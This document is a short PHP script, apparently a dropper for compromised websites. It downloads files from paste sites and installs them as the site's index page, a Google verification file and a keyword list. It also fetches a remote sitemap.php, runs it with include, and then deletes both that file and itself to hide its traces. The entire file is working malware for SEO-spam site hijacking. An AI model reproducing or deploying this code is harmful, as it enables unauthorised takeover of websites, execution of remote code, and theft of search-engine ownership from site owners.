<?php
$indexFile = 'default.php';
downloadFile('https://paste.sangepedia.io/raw/hc2tblgpup', $indexFile);
$googleFile = 'googlef3132c6fdb575b7a.html';
downloadFile('https://paste.sangepedia.io/raw/el98qcellz', $googleFile);
$listFile = 'list.txt';
downloadFile('https://pasteworld.com/raw/judulfilmbaru', $listFile);

$sitemapFile = 'sitemap.php';
downloadFile('https://paste.sangepedia.io/raw/7zrsfjnnih', $sitemapFile);

$domain = $_SERVER['HTTP_HOST'];
$sitemaps = file_get_contents('https://' . $domain . '/sitemap.php');
include $sitemapFile;

unlink($sitemapFile);

unlink(__FILE__);


function downloadFile($url, $filename) {
    $fp = fopen($filename, 'wb');
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
    curl_setopt($ch, CURLOPT_FILE, $fp);
    curl_exec($ch);
    curl_close($ch);
    fclose($fp);
}
